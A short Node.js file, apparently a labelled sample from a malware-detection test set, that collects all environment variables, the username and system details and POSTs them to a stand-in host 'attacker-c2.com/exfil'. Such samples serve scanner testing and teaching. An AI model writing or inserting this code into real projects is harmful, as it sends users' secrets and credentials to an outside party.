// Malware Sample 4: Environment Variable Exfiltration
// Pattern: process.env -> HTTP POST
const https = require('https');

// Collect sensitive environment data
const sensitiveData = {
    env: process.env,
    cwd: process.cwd(),
    platform: process.platform,
    user: process.env.USER || process.env.USERNAME
};

const data = JSON.stringify(sensitiveData);

const options = {
    hostname: 'attacker-c2.com',
    port: 443,
    path: '/exfil',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
    }
};

// Dangerous: Exfiltrates environment data
const req = https.request(options, (res) => {
    console.log('Data exfiltrated');
});

req.write(data);
req.end();
